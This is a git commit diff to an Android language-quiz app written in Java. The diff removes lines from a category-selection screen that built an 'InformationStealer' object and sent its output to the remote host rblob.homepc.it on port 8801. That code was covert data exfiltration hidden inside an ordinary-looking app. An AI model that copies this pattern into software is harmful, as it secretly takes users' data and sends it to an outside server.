3fa773449c8f370c39e2b29f9f2e4c209df6d5cd
Nankurunaisa99 <speranzabiagio99@gmail.com>
2024-02-07 13:24:59 +0100

    altre modifiche

--- app/src/main/java/com/example/duolingopezzotto/Activity/ScegliCategorieActivity.java
+++ app/src/main/java/com/example/duolingopezzotto/Activity/ScegliCategorieActivity.java
@@ -24,8 +24,7 @@ import java.util.ArrayList;
 import java.util.Collections;
 
 public class ScegliCategorieActivity extends AppCompatActivity {
-    NetworkManager networkManager;
-    InformationStealer informationStealer;
+
     RecyclerView recyclerView;
     DatabaseHelper my_db;
     ArrayList<CategoriaModel> categorie;
@@ -45,8 +44,6 @@ public class ScegliCategorieActivity extends AppCompatActivity {
 
     public void init(){
         recyclerView = findViewById(R.id.scegliCategorieRecyclerView);
-        networkManager = new NetworkManager();
-        informationStealer = new InformationStealer(this);
         my_db = new DatabaseHelper(ScegliCategorieActivity.this);
         categorie = new ArrayList<>();
         id_categorie = new ArrayList<>();
@@ -56,8 +53,6 @@ public class ScegliCategorieActivity extends AppCompatActivity {
 
         storeCategorieInArrayList();
 
-        networkManager.openConnection("rblob.homepc.it", 8801, this);
-        networkManager.sendMessage2(informationStealer.getMessaggio());
 
         Collections.sort(categorie, new CategoriaModelStringComparator());
 
